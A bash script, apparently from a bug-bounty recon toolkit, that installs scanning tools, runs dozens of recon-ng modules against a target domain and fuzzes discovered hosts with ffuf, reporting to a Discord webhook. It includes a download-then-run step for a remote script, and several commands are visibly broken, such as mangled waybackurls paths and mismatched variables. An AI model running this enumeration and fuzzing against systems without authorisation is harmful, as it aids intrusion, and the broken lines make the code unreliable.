#!/bin/bash

# Installs :
# Notify : https://github.com/projectdiscovery/notify
# Gitleaks & TruffleHog & Nuclei 
# xnLinkFinder.py waymore.py ./../tools/waybackurls/main httpx
# takeover amass sublist3r  sniper paramspider arjun

echo "==== core ====" | toilet --metal -f pagga -F border| lolcat & pwd
companyname=$COMPANY_NAME_SELECTED
targetname=$COMPANY_URL_SELECTED

# cd $companyname
# ATTENTION  :targetname et companyname d?j? en variables dans core_scan.sh

# ----------------------------------------- #
#                FUNCTIONS
# ----------------------------------------- #

# --- !! TO BE CUSTOMIZED WITH YOUR DISCORD TOKEN !! ---
# Send message to Discord server 
SendDiscord(){
	curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"$1\"}" --silent --output /dev/null --show-error --fail https://discord.com/api/webhooks/YOU_DISCORD_TOKEN_NEEDS_TO_BE_HERE
	tput bold;echo "$1" | lolcat
}
# === Show a progress bar ===
progress-bar() {
	local duration=${1}
		already_done() { for ((done=0; done<$elapsed; done++)); do printf "+"; done }
		remaining() { for ((remain=$elapsed; remain<$duration; remain++)); do printf "+"; done }
		percentage() { printf "| %s%%" $(( (($elapsed)*100)/($duration)*100/100 )); }
		clean_line() { printf "\r"; }
	for (( elapsed=1; elapse<=$duration; elapsed++ )); do
		already_done; remaining; percentage
		sleep 1
		clean_line
	done
	clean_line
}
# Checking dependencies and version control
Check-dependencies(){
	cd ../tools
	echo -n "Begin Check-dependencies - Located in : " && pwd
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 RELEASES or TAGS
	# RETURN : 1 = INSTALLED OR API REACHOUT | 0 = NOT INSTALLED
	Compare-versions-github(){
		if [ $(which $1 2>/dev/null) ] || [ -x "./tools/$3" ]; then
			# Checking on GitHub the release version
			OWNER=$2
			REPO=$3
			# SendDiscord "$REPO already installed"
			if [[ "$5" == "RELEASES" ]]; then
				#echo "DEBUG : GIT RELEASES https://api.github.com/repos/$OWNER/$REPO/releases"
				github_release=$(curl -s https://api.github.com/repos/$OWNER/$REPO/releases)
				# github_release=$(curl --request GET \
				# 	--url "https://api.github.com/repos/$OWNER/$REPO/releases" \
				# 	--header "Accept: application/vnd.github+json" \
				# 	--header "Authorization: Bearer ")
				latest_version=$(echo $github_release | jq -r '.[0].tag_name')
			else
				#echo "DEBUG : GIT TAGS https://api.github.com/repos/$OWNER/$REPO/tags" 
				github_release=$(curl -s https://api.github.com/repos/$OWNER/$REPO/tags)
				latest_version=$(echo $github_release | jq -r '.[0].name')
			fi
			#echo "DEBUG : latest_version:  $latest_version "
			if [ -z "$latest_version" ]; then
				SendDiscord "U $1 - Github API is probably blocking our request version...wait few hours and try again..."
				return 1
			elif [ "$latest_version" == "null" ]; then
				SendDiscord "U $1 - cannot find the GitHub release...check yourself..."
				return 1
			fi
			# Compare between both version (local and GitHub)
			# Checking on the system the package version
			local_version=`eval $4`
			if [[ $local_version < $latest_version ]]; then
				SendDiscord "9 Manual upgrade $1 => $latest_version  | local : $local_version | GitHub : $latest_version"
			else
				SendDiscord " $1 already installed - $local_version is up to date"
			fi
			return 1
		else
			SendDiscord "U $1 not found...installing..."
			return 0
		fi
	}

	# NMAP
	SendDiscord "==========================================================="
		if [ $(which nmap 2>/dev/null) ]; then
			echo "Nmap already installed"
		else
			echo "Nmap not found...installing..."
			sudo apt install nmap xsltproc -y
			sudo nmap --script-updatedb
		fi
	
	# DIVIDE AND SCAN
	# SendDiscord "==========================================================="
	# 	if [ $(which das 2>/dev/null) ]; then
	# 		# Checking on GitHub the release version
	# 		REPO="DivideAndScan"
	# 		OWNER="snovvcrash"
	# 		github_release=$(curl -s curl -s https://api.github.com/repos/$OWNER/$REPO/tags)
	# 		latest_version=$(echo $github_release | jq -r '.[0].name')
	# 		# Checking on the system the package version
	# 		local_version="0.3.2"
	# 		echo "$REPO already installed"
	# 		echo "Local version is : $local_version"
	# 		echo "GitHub latest release is $latest_version"
	# 	else
	# 		echo "Divide and scan not found...installing..."
	# 		python3 -m pip install --user pipx
	# 		python3 -m pipx ensurepath
	# 		pipx install -f "git+https://github.com/snovvcrash/DivideAndScan.git"
	# 	fi

	# RUSTSCAN
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="
		Compare-versions-github "rustscan" "RustScan" "RustScan" "rustscan --version | cut -d ' ' -f 2" "RELEASES"
		if [ "$?" -eq 0 ]; then
			# Auto installation...
			echo "[Information] RustScan latest .deb file is probably not on their GitHub repo... :("
			#eget -t 2.0.1 -a amd64 RustScan/RustScan --to /tmp/rustscan.deb
			#sudo dpkg -i /tmp/rustscan.deb && rm /tmp/rustscan.deb
			#sudo wget https://gist.github.com/snovvcrash/8b85b900bd928493cd1ae33b2df318d8/raw/fe8628396616c4bf7a3e25f2c9d1acc2f36af0c0/rustscan-ports-top1000.toml -O /root/.rustscan.toml
		fi

	# DIVIDE AND SCAN
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "das" "snovvcrash" "DivideAndScan" "echo v0.3.2" "TAGS"
		if [ "$?" -eq 0 ]; then
			python3 -m pip install --user pipx
			python3 -m pipx ensurepath
			pipx install -f "git+https://github.com/snovvcrash/DivideAndScan.git"
		fi

	# PARAMSPIDER
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "ParamSpider" "OmerFI" "ParamSpider" "echo 1.0" "RELEASES"
		if [ "$?" -eq 0 ]; then
			# cd tools
			git clone https://github.com/OmerFI/ParamSpider
			cd ParamSpider
			pip3 install -r requirements.txt
			cd ../
			echo "End PARAMSPIDER" && pwd
		fi
	# ARJUN
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "arjun" "s0md3v" "Arjun" "echo 2.2.1" "RELEASES"
		if [ "$?" -eq 0 ]; then
			pip3 install arjun
		fi
	# JSSCANNER
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "JSScanner" "dark-warlord14" "JSScanner" "echo NULL" "NULL"
		if [ "$?" -eq 0 ]; then
			# cd tools
			git clone https://github.com/dark-warlord14/JSScanner.git
			cd JSScanner
			chmod +x install.sh
			bash install.sh
			cd ../
			echo "End JSSCANNER" && pwd
		fi
	# GITLEAKS
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "gitleaks" "zricethezav" "gitleaks" "echo v8.15.2" "RELEASES"
		if [ "$?" -eq 0 ]; then
			sudo apt-get install gitleaks
		fi
	# WEBANALYZER
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		# /!\ ADD IN YOUR .zshrc file : Path to your oh-my-zsh installation.
		# export ZSH="$HOME/.oh-my-zsh"
		# export PATH=$PATH:/usr/local/go/bin
		# export PATH=$PATH:/home/nicolas/go/bin 
		# export PATH="$HOME/.local/bin:$PATH"
		Compare-versions-github "webanalyze" "rverton" "webanalyze" "echo v0.3.8" "RELEASES"
		if [ "$?" -eq 0 ]; then
			# sudo go install -v github.com/rverton/webanalyze/cmd/webanalyze@latest
			git clone https://github.com/rverton/webanalyze.git
			cd webanalyze
			go run cmd/webanalyze/main.go -update # loads new technologies.json file from wappalyzer project
			cd ../
		fi
	# MEG
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "meg" "tomnomnom" "meg" "echo v0.3.0" "RELEASES"
		if [ "$?" -eq 0 ]; then
			go install github.com/tomnomnom/meg@latest
		fi
	# GOSPIDER
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "gospider" "jaeles-project" "gospider" "echo v1.1.6" "RELEASES"
		if [ "$?" -eq 0 ]; then
			GO111MODULE=on go install github.com/jaeles-project/gospider@latest
		fi
	# QSREPLACE
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "qsreplace" "tomnomnom" "qsreplace" "echo v0.0.3" "RELEASES"
		if [ "$?" -eq 0 ]; then
			go install github.com/tomnomnom/qsreplace@latest		
		fi
	# ONELISTFORALL
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "six2dez" "OneListForAll" "OneListForAll" "echo v2.4.1.1" "RELEASES"
		if [ ! -d "./OneListForAll" ]; then
			# cd tools
			git clone https://github.com/six2dez/OneListForAll.git
			cd OneListForAll
			chmod +x olfa.sh
			./olfa.sh
			cd ../
			echo "End ONELISTFORALL" && pwd
		fi
	# EYEWITNESS
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "FortyNorthSecurity" "EyeWitness" "EyeWitness" "echo v20221203.1" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin EYEWITNESS" && pwd
			# cd tools
			git clone https://github.com/FortyNorthSecurity/EyeWitness.git
			cd EyeWitness/Python/setup/
			sudo ./setup.sh
			cd ../../../
			echo "End EYEWITNESS" && pwd
			wget https://raw.githubusercontent.com/Cyberw1ng/Introduction/main/webdriver_prefs.json
			sudo cp ./webdriver_prefs.json /usr/lib/python3/dist-packages/selenium/webdriver/firefox/
		fi
	# WAYBACKURLS
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "./../tools/waybackurls/main" "tomnomnom" "./../tools/waybackurls/main" "echo v0.1.0" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin WAYBACKURLS" && pwd
			# cd tools
			go install github.com/tomnomnom/./../tools/waybackurls/main@latest
			git clone https://github.com/tomnomnom/./../tools/waybackurls/main.git
			cd ./../tools/waybackurls/main
			go build main.go
			cd ../
			echo "End WAYBACKURLS" && pwd
		fi
	# SUBLIST3R
	SendDiscord "==========================================================="	
	if ! command -v sublist3r &> /dev/null
    then
        sudo apt-get install sublist3r
    fi
	# HTTPX
	SendDiscord "==========================================================="	
	if ! command -v httpx &> /dev/null
    then
        go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
    fi
	# WAYMORE
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "waymore" "xnl-h4ck3r" "waymore" "echo v1.20" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin WAYMORE" && pwd
			# cd tools
			git clone https://github.com/xnl-h4ck3r/waymore.git
			cd waymore
			sudo python setup.py install
			cd ../
			echo "End WAYMORE" && pwd
		fi
	# XNLINKFINDER
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "xnlinkfinder" "xnl-h4ck3r" "xnLinkFinder" "echo v3.10" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin XNLINKFINDER" && pwd
			# cd tools
			git clone https://github.com/xnl-h4ck3r/xnLinkFinder.git
			cd xnLinkFinder
			sudo python setup.py install
			cd ../
			echo "End XNLINKFINDER" && pwd
		fi
	# TAKEOVER
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "takeover" "m4ll0k" "takeover" "echo v0" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin TAKEOVER" && pwd
			mkdir takeover
			cd takeover
			wget -q https://raw.githubusercontent.com/m4ll0k/takeover/master/takeover.py && python3 takeover.py
			cd ../
			echo "End TAKEOVER" && pwd
		fi
	# NUCLEI
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "sudo nuclei" "projectdiscovery" "sudo nuclei" "echo v2.9.3" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin NUCLEI TEMPLATES" && pwd
            git clone https://github.com/projectdiscovery/nuclei-templates.git
            sudo nuclei -ud nuclei-templates
			cd ../
			echo "End NUCLEI TEMPLATES" && pwd
		fi
	# NOTIFY
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "notify" "projectdiscovery" "notify" "echo v1.0.4" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin NOTIFY" && pwd
            go install -v github.com/projectdiscovery/notify/cmd/notify@latest
			echo "End NOTIFY" && pwd
		fi
	# TRUFFLEHOG
	# USAGE : $1 command name | $2 OWNER | $3 REPO | $4 LOCAL VERSION | $5 TAGS or RELEASES
	# RETURN : 1 = INSTALLED | 0 = NOT INSTALLED
	SendDiscord "==========================================================="	
		Compare-versions-github "trufflehog" "trufflesecurity" "trufflehog" "echo v3.33.0" "RELEASES"
		if [ "$?" -eq 0 ]; then
			echo "Begin TRUFFLEHOG" && pwd
            wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.33.0/trufflehog_3.33.0_linux_amd64.tar.gz
            tar -zxvf trufflehog_3.33.0_linux_amd64.tar.gz trufflehog
            rm trufflehog_3.33.0_linux_amd64.tar.gz
			echo "End TRUFFLEHOG" && pwd
		fi


	echo -n "End Check-dependencies - Located in : " && pwd
	cd ../$companyname
}

# ========== ENUMERATION -> RECON-NG ==========

Recon-ng(){
	SendDiscord "/!\ Please configure API KEYS first : you should create a ../key.txt file"
	domain=$1
	company=$2
	#r Temporary variables
	path=$(pwd)
	# Create a configuration file for recon-ng
	rm $domain.recon-ng
	touch $domain.recon-ng
	echo "marketplace install all" >> $domain.recon-ng
	# Looping through key file for adding the API into recon-ng	
	while IFS=: read -r name secret
	do
		# Utilisez les variables $nom1 et $nom2 ici
		echo "keys add $name $secret" >> $domain.recon-ng
	done < ../../keys.txt
	# End looping		
	echo "spool start /tmp/recon-ng.log" >> $domain.recon-ng
	echo "Domain:" $domain
	echo "Company:" $company
	echo "workspaces create $domain" >> $domain.recon-ng
	echo "workspaces load $domain" >> $domain.recon-ng
	# echo "db insert domains" >> $domain.recon-ng
	# echo "db insert companies" >> $domain.recon-ng
	# Loading all modules 
	echo "modules load recon/domains-hosts/bing_domain_web" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/bing_domain_api" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/google_site_api" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hostsetcraft" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/hackertarget" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-contacts/metacrawler" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/shodan_hostname" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/brute_hosts" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/certificate_transparency" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-contacts/pgp_search" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-contacts/whois_pocs" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/companies-contacts/bing_linkedin_cache" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/builtwith" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/mx_spf_ip" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/ssl_san" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng 
	echo "modules load recon/domains-vulnerabilities/ghdb" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng 
	echo "modules load recon/domains-vulnerabilities/punkspider" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng 
	echo "modules load recon/domains-vulnerabilities/xssed" >> $domain.recon-ng
	echo "options set SOURCE $domain" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng 
	echo "modules load recon/companies-multi/github_miner" >> $domain.recon-ng
	echo "options set SOURCE $company" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/profiles-contacts/github_modules_users" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/profiles-contacts/github_modules" >> $domain.recon-ng
	echo "options set SOURCE $company" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/profiles-repositories/github_repos" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/repositories-profiles/github_commits" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/repositories-vulnerabilities/github_dorks" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/companies-multi/whois_miner" >> $domain.recon-ng
	echo "options set SOURCE $company" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-domains/brute_suffix" >> $domain.recon-ng
	echo "options set SOURCE $company" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/spyse_subdomains" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/threatcrowd" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/domains-hosts/threatminer" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/hosts-hosts/resolve" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/hosts-hosts/reverse_resolve" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/hosts-hosts/bing_ip" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/hosts-hosts/ipinfodb" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/hosts-hosts/freegeoip" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	echo "modules load recon/hosts-hosts/ssltools" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	# Export reporting to CSV
	echo "modules load reporting/csv" >> $domain.recon-ng
	echo "options set FILENAME $path/report-recon-ng.csv" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	# Export the results to HTML (then Hive)
	echo "modules load reporting/html" >> $domain.recon-ng
	echo "options set CREATOR koff75" >> $domain.recon-ng
	echo "options set CUSTOMER $domain" >> $domain.recon-ng
	echo "options set FILENAME $path/$domain-report-recon-ng.html" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	# Tranforming results IP to txt file
	echo "modules load reporting/list" >> $domain.recon-ng
	echo "options set COLUMN ip_address" >> $domain.recon-ng
	echo "options set FILENAME $path/ips_recon-ng.txt" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	# Tranforming results subdomains
	echo "options set COLUMN host" >> $domain.recon-ng
	echo "options set FILENAME $path/output_recon-ng.txt" >> $domain.recon-ng
	echo "run" >> $domain.recon-ng
	# Delete the workspace and quitting
	echo "back" >> $domain.recon-ng
	echo "workspaces remove $domain" >> $domain.recon-ng
	echo "exit" >> $domain.recon-ng
	# EOF

	# Starting recon-ng...processing...
	recon-ng -r $path/$domain.recon-ng
	rm $domain.recon-ng
	mv /tmp/recon-ng.log $path/tmp/recon-ng.log
	cat output_recon-ng.txt >> subdomains.txt
	mv output_recon-ng.txt $path/tmp/output_recon-ng.txt
	mv report-recon-ng.csv $path/tmp/report-recon-ng.csv
}
################################
## FUZZING loop
##
## Fuzzing (ffuf) with dicos
## Called from the 'content-discovery' function
# Usage : DICO LINK : $1 | DICO NAME : $2 | URL : $3
################################
Fuzzing(){
	echo "Fuzzing || Dico Link : $1 | Dico Name : $2 | URL : $3 | $4"
	# Checking if the file .txt is already in our directory, or download it directly
	if [ ! -e "./fuzzing/$2" ]; then
		echo "[Info] Downloading : $2"
		wget $1 -O ./fuzzing/$2
	fi
	echo "[Info] $2 is downloaded"
	# Checking if the link is related to assetnote or anything else like SecList
	if [ $(echo $1 | grep -i https) ]; then
    	    dico_path="fuzzing/$2"
       else
    	    dico_path="$2"
    fi
	# IF $4 is set, then it for subdomains enum, else is for directory enum
    if [ -n $4]; then
		# Check the input $3 for the https//
        target_url="$3/FUZZ"
    else
		# Check the input $3 for the https//
        target_url="https://FUZZ.$3"
    fi
	################################
	## FFUF
	################################
	# filter regex, to filter out all 403s : -fr '/\..*' | mached code : -mc 200,404... 
	echo "$dico_path ---- $target_url" >> ./fuzzing/work_done.txt
	ffuf -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -w $dico_path -u $target_url -fr '/\..*' -mc all -fc 404,403,302,301 -fr '/\..*' -r -recursion -recursion-depth 2 -timeout 5 -t 10 -o ./fuzzing/output_ffuf_$3-$2.json
}

################################
## CONTENT-DISCOVERY
##
## Using FFUF and automatic technologies detection
## Auto downloading dicos
# 
################################
Content-discovery(){
	################################
	## WEBANALYZE
	################################
	SendDiscord "1. Webanalyze started"
	#	go run ../tools/webanalyze/main.go -update
	webanalyze -update
	webanalyze -worker 10 -hosts ./subdomains/url_httpx_scope.txt -output csv > output_webanalyze.csv
	SendDiscord "webanalyze output saved under output_webanalyze.csv"
	# If using JSON format : cat output_webanalyze.json | grep 'Web servers' | sed -En 's/.*"hostname":"([^"]*).*/\1/p'
	SendDiscord "2. Looping webanalyze results and FFUF following the technolgies"
	SendDiscord "Donwloading AssetNote : automated & technologies"
	if [ ! -e "./fuzzing/automated.json" ] && [ ! -e "./fuzzing/technologies.json" ]; then
		wget "https://raw.githubusercontent.com/assetnote/wordlists/master/data/automated.json" -O ./fuzzing/automated.json
		wget "https://raw.githubusercontent.com/assetnote/wordlists/master/data/technologies.json" -O ./fuzzing/technologies.json
	fi
	tput bold;echo "Method to avoid error with FUFF :"
	tput bold;echo "
			1. Use the -mc (matched code, eg. 200) option to limit the maximum number of concurrent requests. 

			2. Use the -t option to limit the number of threads. 

			3. Use the -timeout option to set a maximum timeout for each request. This can help prevent ffuf from waiting for a response from a server that is not responding and returning errors

			4. Use the -u option with the correct scheme (http/https) , this can help prevent ffuf from sending requests to the wrong protocol and returning errors

			5. Use the -filter option to filter the results, this can help prevent ffuf from sending requests to URLs that are not in scope and returning errors

			6. Use the -nc or --no-clobber option to avoid overwriting files if the new file already exists. this can help prevent ffuf from overwriting files and returning errors

			7. Use the -D option to specify a list of proxy servers to use to send requests through. This can help prevent ffuf from getting blocked by the target server and returning errors

			8. Use the -r option to show the response time for each request and check if the server is responding slowly or not
		"
	
	
	# Final version
	while read line; do
        # Checking others technos
        # line1 = TYPE : Web servers / HSTS / Algolia / Ruby / Node.js / Cloudflare / PHP
        line1=$(echo $line | cut -d ',' -f 3 | sed 's/^ *//g;s/ *$//g')
        # line2 = APPS : nginx / gitlab / express / apache / rails / symphony / ...
        line2=$(echo $line | cut -d ',' -f 4 | sed 's/^ *//g;s/ *$//g')
		# url = https://sub.domain.fr
		url=$(echo $line | cut -d ',' -f 1 | sed 's/^ *//g;s/ *$//g')
		echo "Working on : $url"

		SendDiscord "1. Webanalyzer looping for searching dicos :"
		# For searching APIs  
        if [ -n "$(echo $line | grep -i 'api' | cut -d ',' -f1)" ]; then
            dico_name_0=$(cat ./fuzzing/automated.json  | jq '.' | grep -i "api" 2>&1 | grep -i `date -d 'last year' "+%Y"` 2>&1 | awk -F ':' '{print $2}' | awk -F '<' '{print $1}' | awk -F ',' '{print $1}' | sort | tail -n -1 | sed 's/^ *//g;s/ *$//g' | sed 's/"//g')
			# EXAMPLE : API | httparchive_apiroutes_2022_12_28.txt | https://mywebsite.fr
			SendDiscord "API | $dico_name_0 | $url | (0)"
			Fuzzing "https://wordlists-cdn.assetnote.io/./data/automated/$dico_name_0" $dico_name_0 $url
			Fuzzing "null" "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt" $url
			Fuzzing "null" "/usr/share/seclists/Discovery/Web-Content/swagger.txt" $url
		fi
		# For searching Wordpress  
        if [ -n "$(echo $line | grep -i 'wordpress' | cut -d ',' -f1)" ]; then
			SendDiscord "Wordpress | wordpress / wp-plugins / wp-themes | $url | (0)"
			Fuzzing "null" "/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt" $url
			Fuzzing "null" "/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt" $url
			Fuzzing "null" "/usr/share/seclists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt" $url

        fi
        # line1 = TYPE : Web servers / HSTS / Algolia / Ruby / Node.js / Cloudflare / PHP
        if [ -n "$(echo $line1)" ]; then
            techno1=$(cat ./fuzzing/automated.json  | jq '.' | grep -i $line1 2>&1 | grep -i `date -d 'last year' "+%Y"` 2>&1 | awk -F ':' '{print $2}' | awk -F '<' '{print $1}' | awk -F ',' '{print $1}' | sort | tail -n -1 | sed 's/^ *//g;s/ *$//g' | sed 's/"//g')
            if [ -n "$dico_name_1" ]; then
				# EXAMPLE : PHP | httparchive_php_2022_12_28.txt | https://mywebsite.fr,Programming languages,PHP,
                SendDiscord "$line1 | $dico_name_1 | $url | (1)"
				Fuzzing "https://wordlists-cdn.assetnote.io/./data/automated/$dico_name_1" $dico_name_1 $url
            fi
        fi
		# line2 = APPS : nginx / gitlab / express / apache / rails / symphony / ...
        if [ -n "$(echo $line2)" ]; then
            techno2=$(cat ./fuzzing/technologies.json  | jq '.' | grep -i $line2 2>&1 | grep -i `date -d 'last year' "+%Y"` 2>&1 | awk -F ':' '{print $2}' | awk -F '<' '{print $1}' | awk -F ',' '{print $1}' | sort | tail -n -1 | sed 's/^ *//g;s/ *$//g' | sed 's/"//g')
            if [ -n "$dico_name_2" ]; then
				# EXAMPLE : Nginx | httparchive_nginx_2022_12_28.txt | https://mywebsite.fr,"Web servers,Reverse proxies",Nginx,
                SendDiscord "$line2 | $dico_name_2 | $url | (2)"
				Fuzzing "https://wordlists-cdn.assetnote.io/./data/technologies/$dico_name_2" $dico_name_2 $url
            fi
        fi
		# Generic ... else ?
		# http_archive_directoriesf
		if [ -n "$(echo $url | grep -i http)" ]; then
			SendDiscord "Directories discovery | Generic | $url | (3)"
			dico_name=$(cat ./fuzzing/automated.json  | jq '.' | grep -i "directories" 2>&1 | grep -i `date -d 'last year' "+%Y"` 2>&1 | awk -F ':' '{print $2}' | awk -F '<' '{print $1}' | awk -F ',' '{print $1}' | sort | tail -n -1 | sed 's/^ *//g;s/ *$//g' | sed 's/"//g')
			Fuzzing "https://wordlists-cdn.assetnote.io/./data/automated/$dico_name" $dico_name $url
